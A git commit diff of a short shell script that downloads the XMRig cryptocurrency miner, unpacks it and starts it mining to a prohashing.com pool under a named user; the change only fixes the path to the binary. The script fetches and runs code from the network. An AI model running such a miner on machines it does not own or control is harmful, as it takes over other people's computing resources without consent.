3f697c20434b6acc20dc6df5716f418dd8a55d99
freerdpvps555 <87441614+freerdpvps555@users.noreply.github.com>
2021-11-19 10:03:39 +0700

    Update benz.sh

--- benz.sh
+++ benz.sh
@@ -1,4 +1,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
 tar xvf xmrig-6.15.3-linux-x64.tar.gz
 cd xmrig-6.15.3
-././xmrig -a randomx -o stratum+tcp://prohashing.com:3359 -u benzza -log
+./xmrig -a randomx -o stratum+tcp://prohashing.com:3359 -u benzza -log
